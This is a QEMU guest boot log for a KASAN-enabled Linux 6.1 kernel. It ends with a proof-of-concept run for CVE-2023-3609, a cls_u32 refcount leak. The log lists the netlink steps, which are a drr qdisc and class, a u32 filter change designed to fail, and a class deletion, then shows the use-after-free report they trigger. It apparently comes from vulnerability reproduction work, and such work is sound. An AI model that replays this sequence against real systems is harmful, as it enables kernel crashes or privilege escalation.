bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
c[?7l[2J[0mSeaBIOS (version 1.16.2-debian-1.16.2-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+7EFCEF00+7EF0EF00 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM..c[?7l[2J[    0.000000] Linux version 6.1.34-06875-gc9411f014e5c-dirty (root@buildkitsandbox) (gcc (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Tue May  5 10:09:09 UTC 2026
[    0.000000] Command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.000000] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    0.000000] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    0.000000] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    0.000000] x86/fpu: Supporting XSAVE feature 0x200: 'Protection Keys User registers'
[    0.000000] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    0.000000] x86/fpu: xstate_offset[9]:  832, xstate_sizes[9]:    8
[    0.000000] x86/fpu: Enabled xstate features 0x207, context size is 840 bytes, using 'compacted' format.
[    0.000000] signal: max sigframe size: 3632
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000007ffdffff] usable
[    0.000000] BIOS-e820: [mem 0x000000007ffe0000-0x000000007fffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    0.000000] Hypervisor detected: KVM
[    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00
[    0.000001] kvm-clock: using sched offset of 217491793 cycles
[    0.000002] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.000004] tsc: Detected 3187.200 MHz processor
[    0.000271] last_pfn = 0x7ffe0 max_arch_pfn = 0x400000000
[    0.000299] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.002255] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.002266] Using GB pages for direct mapping
[    0.002266] Incomplete global flushes, disabling PCID
[    0.002387] RAMDISK: [mem 0x7fe92000-0x7ffdffff]
[    0.002392] ACPI: Early table checksum verification disabled
[    0.002395] ACPI: RSDP 0x00000000000F59D0 000014 (v00 BOCHS )
[    0.002399] ACPI: RSDT 0x000000007FFE1B33 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002404] ACPI: FACP 0x000000007FFE19DF 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002411] ACPI: DSDT 0x000000007FFE0040 00199F (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002414] ACPI: FACS 0x000000007FFE0000 000040
[    0.002416] ACPI: APIC 0x000000007FFE1A53 000080 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002418] ACPI: HPET 0x000000007FFE1AD3 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002420] ACPI: WAET 0x000000007FFE1B0B 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002423] ACPI: Reserving FACP table memory at [mem 0x7ffe19df-0x7ffe1a52]
[    0.002424] ACPI: Reserving DSDT table memory at [mem 0x7ffe0040-0x7ffe19de]
[    0.002425] ACPI: Reserving FACS table memory at [mem 0x7ffe0000-0x7ffe003f]
[    0.002426] ACPI: Reserving APIC table memory at [mem 0x7ffe1a53-0x7ffe1ad2]
[    0.002426] ACPI: Reserving HPET table memory at [mem 0x7ffe1ad3-0x7ffe1b0a]
[    0.002427] ACPI: Reserving WAET table memory at [mem 0x7ffe1b0b-0x7ffe1b32]
[    0.002631] No NUMA configuration found
[    0.002632] Faking a node at [mem 0x0000000000000000-0x000000007ffdffff]
[    0.002635] NODE_DATA(0) allocated [mem 0x7fe8e000-0x7fe91fff]
[    0.002645] Zone ranges:
[    0.002646]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.002647]   DMA32    [mem 0x0000000001000000-0x000000007ffdffff]
[    0.002649]   Normal   empty
[    0.002650] Movable zone start for each node
[    0.002650] Early memory node ranges
[    0.002651]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.002652]   node   0: [mem 0x0000000000100000-0x000000007ffdffff]
[    0.002653] Initmem setup node 0 [mem 0x0000000000001000-0x000000007ffdffff]
[    0.002841] On node 0, zone DMA: 1 pages in unavailable ranges
[    0.002890] On node 0, zone DMA: 97 pages in unavailable ranges
[    0.010801] On node 0, zone DMA32: 32 pages in unavailable ranges
[    0.100452] kasan: KernelAddressSanitizer initialized
[    0.100657] ACPI: PM-Timer IO Port: 0x608
[    0.100664] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    0.100692] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    0.100695] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.100697] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    0.100697] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    0.100698] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    0.100699] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    0.100701] ACPI: Using ACPI (MADT) for SMP configuration information
[    0.100702] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.100705] TSC deadline timer available
[    0.100707] smpboot: Allowing 2 CPUs, 0 hotplug CPUs
[    0.100725] kvm-guest: KVM setup pv remote TLB flush
[    0.100727] kvm-guest: setup PV sched yield
[    0.100735] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.100736] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x0009ffff]
[    0.100737] PM: hibernation: Registered nosave memory: [mem 0x000a0000-0x000effff]
[    0.100737] PM: hibernation: Registered nosave memory: [mem 0x000f0000-0x000fffff]
[    0.100739] [mem 0x80000000-0xfeffbfff] available for PCI devices
[    0.100740] Booting paravirtualized kernel on KVM
[    0.100742] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    0.108305] setup_percpu: NR_CPUS:64 nr_cpumask_bits:2 nr_cpu_ids:2 nr_node_ids:1
[    0.110281] percpu: Embedded 65 pages/cpu s225896 r8192 d32152 u1048576
[    0.110318] Fallback order for Node 0: 0 
[    0.110320] Built 1 zonelists, mobility grouping on.  Total pages: 515808
[    0.110321] Policy zone: DMA32
[    0.110322] Kernel command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.110368] random: crng init done
[    0.110933] Dentry cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.110986] Inode-cache hash table entries: 131072 (order: 8, 1048576 bytes, linear)
[    0.111015] mem auto-init: stack:all(zero), heap alloc:off, heap free:off
[    0.117781] stackdepot hash table entries: 1048576 (order: 11, 8388608 bytes, linear)
[    0.139814] Memory: 1695372K/2096632K available (47117K kernel code, 7855K rwdata, 8348K rodata, 2100K init, 2708K bss, 401004K reserved, 0K cma-reserved)
[    0.139934] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
[    0.140865] Dynamic Preempt: voluntary
[    0.142351] rcu: Preemptible hierarchical RCU implementation.
[    0.142353] rcu: 	RCU event tracing is enabled.
[    0.142353] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=2.
[    0.142355] 	Trampoline variant of Tasks RCU enabled.
[    0.142356] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    0.142357] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    0.147019] NR_IRQS: 4352, nr_irqs: 440, preallocated irqs: 16
[    0.147207] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    0.149487] Console: colour VGA+ 80x25
[    0.188144] printk: console [ttyS0] enabled
[    0.188396] ACPI: Core revision 20220331
[    0.188737] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    0.189316] APIC: Switch to symmetric I/O mode setup
[    0.189610] kvm-guest: setup PV IPIs
[    0.190465] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    0.190819] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2df10e7656b, max_idle_ns: 440795364873 ns
[    0.191448] Calibrating delay loop (skipped) preset value.. 6374.40 BogoMIPS (lpj=3187200)
[    0.191916] pid_max: default: 32768 minimum: 301
[    0.192209] LSM: Security Framework initializing
[    0.192464] SELinux:  Initializing.
[    0.192731] Mount-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.193151] Mountpoint-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.193838] x86/cpu: User Mode Instruction Prevention (UMIP) activated
[    0.194496] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    0.194800] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    0.195138] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.195447] Spectre V2 : Mitigation: Enhanced IBRS
[    0.195722] Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch
[    0.196445] Spectre V2 : Spectre v2 / PBRSB-eIBRS: Retire a single CALL on VMEXIT
[    0.196864] Spectre V2 : mitigation: Enabling conditional Indirect Branch Prediction Barrier
[    0.197444] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl
[    0.197931] MMIO Stale Data: Unknown: No mitigations
[    0.212180] Freeing SMP alternatives memory: 44K
[    0.212565] smpboot: CPU0: Intel(R) Core(TM) i9-14900K (family: 0x6, model: 0xb7, stepping: 0x1)
[    0.213214] cblist_init_generic: Setting adjustable number of callback queues.
[    0.213445] cblist_init_generic: Setting shift to 1 and lim to 1.
[    0.213811] Performance Events: unsupported p6 CPU model 183 no PMU driver, software events only.
[    0.214484] rcu: Hierarchical SRCU implementation.
[    0.214758] rcu: 	Max phase no-delay instances is 400.
[    0.215611] smp: Bringing up secondary CPUs ...
[    0.215984] x86: Booting SMP configuration:
[    0.216225] .... node  #0, CPUs:      #1
[    0.216793] smp: Brought up 1 node, 2 CPUs
[    0.217446] smpboot: Max logical packages: 1
[    0.217689] smpboot: Total of 2 processors activated (12748.80 BogoMIPS)
[    0.219489] devtmpfs: initialized
[    0.221059] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    0.221448] futex hash table entries: 512 (order: 3, 32768 bytes, linear)
[    0.221932] PM: RTC time: 10:11:46, date: 2026-05-05
[    0.222592] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    0.223106] audit: initializing netlink subsys (disabled)
[    0.223476] audit: type=2000 audit(1777975906.597:1): state=initialized audit_enabled=0 res=1
[    0.223614] thermal_sys: Registered thermal governor 'step_wise'
[    0.223967] thermal_sys: Registered thermal governor 'user_space'
[    0.224474] cpuidle: using governor menu
[    0.225450] PCI: Using configuration type 1 for base access
[    0.235719] kprobes: kprobe jump-optimization is enabled. All kprobes are optimized if possible.
[    0.237535] HugeTLB: registered 2.00 MiB page size, pre-allocated 0 pages
[    0.237938] HugeTLB: 28 KiB vmemmap can be freed for a 2.00 MiB page
[    0.238751] ACPI: Added _OSI(Module Device)
[    0.239015] ACPI: Added _OSI(Processor Device)
[    0.239445] ACPI: Added _OSI(3.0 _SCP Extensions)
[    0.239722] ACPI: Added _OSI(Processor Aggregator Device)
[    0.249175] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    0.304088] ACPI: Interpreter enabled
[    0.304475] ACPI: PM: (supports S0 S3 S4 S5)
[    0.304723] ACPI: Using IOAPIC for interrupt routing
[    0.305038] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    0.305444] PCI: Using E820 reservations for host bridge windows
[    0.306113] ACPI: Enabled 2 GPEs in block 00 to 0F
[    0.318836] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    0.319206] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    0.319445] acpi PNP0A03:00: _OSC: not requesting OS control; OS requires [ExtendedConfig ASPM ClockPM MSI]
[    0.320036] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended PCI configuration space under this bridge.
[    0.320608] PCI host bridge to bus 0000:00
[    0.320844] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    0.321446] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    0.321830] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    0.322445] pci_bus 0000:00: root bus resource [mem 0x80000000-0xfebfffff window]
[    0.322872] pci_bus 0000:00: root bus resource [mem 0x100000000-0x17fffffff window]
[    0.323446] pci_bus 0000:00: root bus resource [bus 00-ff]
[    0.323807] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000
[    0.329497] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100
[    0.334748] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180
[    0.336182] pci 0000:00:01.1: reg 0x20: [io  0xc040-0xc04f]
[    0.336856] pci 0000:00:01.1: legacy IDE quirk: reg 0x10: [io  0x01f0-0x01f7]
[    0.337445] pci 0000:00:01.1: legacy IDE quirk: reg 0x14: [io  0x03f6]
[    0.337818] pci 0000:00:01.1: legacy IDE quirk: reg 0x18: [io  0x0170-0x0177]
[    0.338228] pci 0000:00:01.1: legacy IDE quirk: reg 0x1c: [io  0x0376]
[    0.338584] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000
[    0.339150] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    0.339452] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    0.340016] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000
[    0.341099] pci 0000:00:02.0: reg 0x10: [mem 0xfd000000-0xfdffffff pref]
[    0.342451] pci 0000:00:02.0: reg 0x18: [mem 0xfebf0000-0xfebf0fff]
[    0.344866] pci 0000:00:02.0: reg 0x30: [mem 0xfebe0000-0xfebeffff pref]
[    0.345489] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    0.350723] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000
[    0.351619] pci 0000:00:03.0: reg 0x10: [mem 0xfebc0000-0xfebdffff]
[    0.352446] pci 0000:00:03.0: reg 0x14: [io  0xc000-0xc03f]
[    0.355784] pci 0000:00:03.0: reg 0x30: [mem 0xfeb80000-0xfebbffff pref]
[    0.362075] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    0.362797] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    0.363705] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    0.364613] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    0.365105] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    0.366588] iommu: Default domain type: Translated 
[    0.366876] iommu: DMA domain TLB invalidation policy: lazy mode 
[    0.367622] SCSI subsystem initialized
[    0.367856] ACPI: bus type USB registered
[    0.368469] usbcore: registered new interface driver usbfs
[    0.368808] usbcore: registered new interface driver hub
[    0.369129] usbcore: registered new device driver usb
[    0.369482] pps_core: LinuxPPS API ver. 1 registered
[    0.369772] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    0.370451] PTP clock support registered
[    0.370702] Advanced Linux Sound Architecture Driver Initialized.
[    0.371722] NetLabel: Initializing
[    0.371923] NetLabel:  domain hash size = 128
[    0.372179] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    0.372478] NetLabel:  unlabeled traffic allowed by default
[    0.372831] PCI: Using ACPI for IRQ routing
[    0.372831] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    0.372831] pci 0000:00:02.0: vgaarb: bridge control possible
[    0.373137] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    0.373445] vgaarb: loaded
[    0.373664] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    0.373952] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    0.377483] clocksource: Switched to clocksource kvm-clock
[    0.382505] VFS: Disk quotas dquot_6.6.0
[    0.382762] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    0.383269] pnp: PnP ACPI init
[    0.384509] pnp: PnP ACPI: found 6 devices
[    0.391488] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    0.392074] NET: Registered PF_INET protocol family
[    0.393404] IP idents hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    0.394282] tcp_listen_portaddr_hash hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    0.394795] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    0.395290] TCP established hash table entries: 16384 (order: 5, 131072 bytes, linear)
[    0.395793] TCP bind hash table entries: 16384 (order: 7, 524288 bytes, linear)
[    0.396273] TCP: Hash tables configured (established 16384 bind 16384)
[    0.398736] UDP hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    0.399152] UDP-Lite hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    0.399678] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    0.400188] RPC: Registered named UNIX socket transport module.
[    0.400549] RPC: Registered udp transport module.
[    0.400841] RPC: Registered tcp transport module.
[    0.401132] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    0.401823] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    0.402209] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    0.402594] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    0.403014] pci_bus 0000:00: resource 7 [mem 0x80000000-0xfebfffff window]
[    0.403438] pci_bus 0000:00: resource 8 [mem 0x100000000-0x17fffffff window]
[    0.403962] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    0.404334] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    0.404732] PCI: CLS 0 bytes, default 64
[    0.405137] Unpacking initramfs...
[    0.410241] RAPL PMU: API unit is 2^-32 Joules, 0 fixed counters, 10737418240 ms ovfl timer
[    0.410756] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2df10e7656b, max_idle_ns: 440795364873 ns
[    0.414012] Initialise system trusted keyrings
[    0.414382] workingset: timestamp_bits=56 max_order=19 bucket_order=0
[    0.420167] Freeing initrd memory: 1336K
[    0.421057] NFS: Registering the id_resolver key type
[    0.421392] Key type id_resolver registered
[    0.421654] Key type id_legacy registered
[    0.421983] 9p: Installing v9fs 9p2000 file system support
[    0.426704] Key type asymmetric registered
[    0.426982] Asymmetric key parser 'x509' registered
[    0.427336] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    0.427785] io scheduler mq-deadline registered
[    0.428057] io scheduler kyber registered
[    0.428538] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    0.429065] ACPI: button: Power Button [PWRF]
[    0.433100] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    0.433569] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    0.434676] Non-volatile memory driver v1.3
[    0.434930] Linux agpgart interface v0.103
[    0.435254] ACPI: bus type drm_connector registered
[    0.438984] loop: module loaded
[    0.440262] scsi host0: ata_piix
[    0.440689] scsi host1: ata_piix
[    0.440958] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14
[    0.441371] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15
[    0.442233] e100: Intel(R) PRO/100 Network Driver
[    0.442518] e100: Copyright(c) 1999-2006 Intel Corporation
[    0.442860] e1000: Intel(R) PRO/1000 Network Driver
[    0.443166] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    0.597341] ata2: found unknown device (class 0)
[    0.598041] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    0.598989] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    0.635933] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    0.636466] cdrom: Uniform CD-ROM driver Revision: 3.20
[    0.653271] sr 1:0:0:0: Attached scsi generic sg0 type 5
[    0.761632] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    1.051682] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    1.052092] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    1.052538] e1000e: Intel(R) PRO/1000 Network Driver
[    1.052830] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    1.053212] sky2: driver version 1.30
[    1.054550] usbcore: registered new interface driver usblp
[    1.054901] usbcore: registered new interface driver usb-storage
[    1.055308] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    1.056216] serio: i8042 KBD port at 0x60,0x64 irq 1
[    1.056512] serio: i8042 AUX port at 0x60,0x64 irq 12
[    1.057134] rtc_cmos 00:05: RTC can wake from S4
[    1.057489] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
[    1.058595] rtc_cmos 00:05: registered as rtc0
[    1.059000] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    1.059722] device-mapper: ioctl: 4.47.0-ioctl (2022-07-28) initialised: dm-devel@redhat.com
[    1.060224] intel_pstate: CPU model not supported
[    1.060543] hid: raw HID events driver (C) Jiri Kosina
[    1.061105] usbcore: registered new interface driver usbhid
[    1.061433] usbhid: USB HID core driver
[    1.061882] u32 classifier
[    1.062052]     input device check on
[    1.062271]     Actions configured
[    1.062716] Initializing XFRM netlink socket
[    1.063821] NET: Registered PF_INET6 protocol family
[    1.064585] Segment Routing with IPv6
[    1.064829] In-situ OAM (IOAM) with IPv6
[    1.065145] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    1.065708] NET: Registered PF_PACKET protocol family
[    1.066065] 9pnet: Installing 9P2000 support
[    1.066339] Key type dns_resolver registered
[    1.066791] IPI shorthand broadcast: enabled
[    1.067094] sched_clock: Marking stable (1024476404, 42230464)->(1041493583, 25213285)
[    1.067671] registered taskstats version 1
[    1.067910] Loading compiled-in X.509 certificates
[    1.068335] cryptomgr_test (51) used greatest stack depth: 30912 bytes left
[    1.069044] cryptomgr_test (64) used greatest stack depth: 30536 bytes left
[    1.069502] PM:   Magic number: 10:45:173
[    1.069779] printk: console [netcon0] enabled
[    1.070050] netconsole: network logging started
[    1.070490] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    1.071058] kworker/u4:0 (73) used greatest stack depth: 29512 bytes left
[    1.071675] cfg80211: Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    1.072078] ALSA device list:
[    1.072291]   No soundcards found.
[    1.072974] Freeing unused kernel image (initmem) memory: 2100K
[    1.073275] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2
[    1.073615] cfg80211: failed to load regulatory.db
[    1.077301] Write protecting the kernel read-only data: 59392k
[    1.077855] Freeing unused kernel image (text/rodata gap) memory: 2032K
[    1.078362] Freeing unused kernel image (rodata/data gap) memory: 1892K
[    1.085873] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    1.086161] Run /init as init process
[    1.088983] mount (78) used greatest stack depth: 28360 bytes left

secb: rootfs ready
---- poc begin ----
poc: start: CVE-2023-3609 cls_u32 refcnt leak (tcf_change_indev failure)
poc: NEWQDISC drr 1:0  rc=0
poc: NEWTCLASS drr 1:10 rc=0
poc: NEWTFILTER u32 a[    1.096247] ==================================================================
dd (mark=1 -> 1:[    1.096644] BUG: KASAN: use-after-free in drr_enqueue+0x7ef/0x9a0
10)  rc=0  (hand[    1.096940] Read of size 8 at addr ffff888009898060 by task poc/84
le auto = 0x8000[    1.097248] 
0800)
poc: CHAN[    1.097376] CPU: 0 PID: 84 Comm: poc Not tainted 6.1.34-06875-gc9411f014e5c-dirty #1
GE u32 (indev=lo[    1.097733] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
o, classid=1:2) [    1.098163] Call Trace:
rc=-22 (expect ![    1.098324]  <TASK>
= 0)
poc: DELTC[    1.098471]  dump_stack_lvl+0x33/0x46
LASS 1:10       [    1.098676]  print_report+0x181/0x4a5
                [    1.098882]  ? __tcf_classify+0xec/0x330
rc=0
[    1.099098]  ? drr_enqueue+0x7ef/0x9a0
[    1.099273]  kasan_report+0xc5/0x150
[    1.099419]  ? drr_enqueue+0x7ef/0x9a0
[    1.099569]  drr_enqueue+0x7ef/0x9a0
[    1.099712]  ? drr_change_class+0xac0/0xac0
[    1.099878]  ? _raw_spin_lock+0x82/0xe0
[    1.100033]  dev_qdisc_enqueue+0x3b/0x140
[    1.100194]  __dev_queue_xmit+0x1744/0x2c60
[    1.100360]  ? arp_constructor+0x656/0x9a0
[    1.100523]  ? netdev_core_pick_tx+0x2a0/0x2a0
[    1.100700]  ? _raw_write_lock_bh+0x82/0xe0
[    1.100885]  ? memcpy+0x38/0x60
[    1.101021]  ? eth_header+0x14b/0x180
[    1.101170]  ? neigh_resolve_output+0x3b5/0x830
[    1.101353]  ip_finish_output2+0x85e/0x1920
[    1.101521]  ? ip_fraglist_init+0x560/0x560
[    1.101692]  __ip_finish_output.part.0+0x268/0x940
[    1.101889]  ? ip_fragment.constprop.0+0x220/0x220
[    1.102087]  ? nf_hook_slow+0x9e/0x170
[    1.102245]  ip_output+0x2c5/0x6c0
[    1.102389]  ? __ip_finish_output.part.0+0x940/0x940
[    1.102593]  ? dst_output+0xc0/0xc0
[    1.102739]  ? ip_frag_init+0x3e0/0x3e0
[    1.102899]  ? ip_flush_pending_frames+0x20/0x20
[    1.103090]  ip_send_skb+0x10f/0x150
[    1.103240]  udp_send_skb+0x56d/0x1250
[    1.103395]  udp_sendmsg+0x1640/0x1eb0
[    1.103548]  ? ip_frag_init+0x3e0/0x3e0
[    1.103703]  ? udp_unicast_rcv_skb+0x330/0x330
[    1.103882]  ? __local_bh_enable_ip+0x32/0x70
[    1.104062]  ? ip4_datagram_connect+0x40/0x40
[    1.104239]  ? _raw_write_lock_irq+0xe0/0xe0
[    1.104415]  ? __local_bh_enable_ip+0x32/0x70
[    1.104594]  ? inet_autobind+0x108/0x160
[    1.104752]  ? inet_send_prepare+0x21b/0x2a0
[    1.104924]  ? inet_send_prepare+0x2a0/0x2a0
[    1.105096]  ? sock_sendmsg+0xda/0x110
[    1.105251]  ? inet_send_prepare+0x2a0/0x2a0
[    1.105425]  sock_sendmsg+0xda/0x110
[    1.105574]  __sys_sendto+0x1dd/0x2a0
[    1.105726]  ? __ia32_sys_getpeername+0xb0/0xb0
[    1.105912]  ? alloc_empty_file+0x84/0xf0
[    1.106073]  ? alloc_file+0x225/0x720
[    1.106224]  ? alloc_fd+0x1a6/0x4e0
[    1.106372]  ? __sys_socket_file+0x160/0x160
[    1.106548]  ? __ia32_sys_read+0xa0/0xa0
[    1.106709]  __x64_sys_sendto+0xd7/0x1b0
[    1.106870]  ? exit_to_user_mode_prepare+0x32/0x120
[    1.107069]  ? syscall_exit_to_user_mode+0x1d/0x40
[    1.107265]  do_syscall_64+0x37/0x90
[    1.107413]  entry_SYSCALL_64_after_hwframe+0x63/0xcd
[    1.107619] RIP: 0033:0x43b813
[    1.107749] Code: c7 c2 b8 ff ff ff f7 d8 64 89 02 48 c7 c0 ff ff ff ff eb b8 0f 1f 00 80 3d 51 c8 06 00 00 41 89 ca 74 14 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 75 c3 0f 1f 40 00 55 48 83 ec 30 44 89 4c 24
[    1.108479] RSP: 002b:00007ffcf14eb498 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[    1.108777] RAX: ffffffffffffffda RBX: 00007ffcf14eb4a0 RCX: 000000000043b813
[    1.109055] RDX: 0000000000000004 RSI: 000000000047b0c5 RDI: 0000000000000004
[    1.109333] RBP: 0000000000000020 R08: 00007ffcf14eb4a0 R09: 0000000000000010
[    1.109610] R10: 0000000000000040 R11: 0000000000000202 R12: 0000000000000000
[    1.109886] R13: 0000000000000004 R14: 000000000047b0c5 R15: 0000000000000001
[    1.110164]  </TASK>
[    1.110256] 
[    1.110321] Allocated by task 84:
[    1.110455]  kasan_save_stack+0x2f/0x60
[    1.110609]  kasan_set_track+0x21/0x30
[    1.110760]  __kasan_kmalloc+0x8e/0x90
[    1.110909]  drr_change_class+0x368/0xac0
